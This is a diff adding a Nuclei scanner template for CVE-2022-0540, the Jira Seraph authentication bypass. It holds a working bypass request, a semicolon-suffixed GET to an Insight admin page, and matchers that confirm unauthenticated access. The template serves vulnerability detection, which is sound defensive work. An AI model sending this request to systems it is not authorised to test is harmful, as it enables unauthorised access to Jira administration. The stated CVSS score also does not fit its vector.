@@ -1,0 +1,31 @@
+id: cve-2022-0540
+info:
+  name: Atlassian Jira Authentication Bypass in Seraph
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A vulnerability in Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.
+  classification:
+    cve-id: CVE-2022-0540
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.9
+  reference:
+    - https://github.com/ARPSyndicate/kenzer-templates/blob/5dc272615d6109789f358034b29da50af50b65cd/nuclei/cvescan/critical/CVE-2022-0540.yaml
+    - https://www.atlassian.com/software/jira
+  tags: unauthorized-access
+
+http:
+  - raw:
+      - |
+        GET /InsightPluginShowGeneralConfiguration.jspa; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "General Insight Configuration"
+          - "常规 Insight 配置"
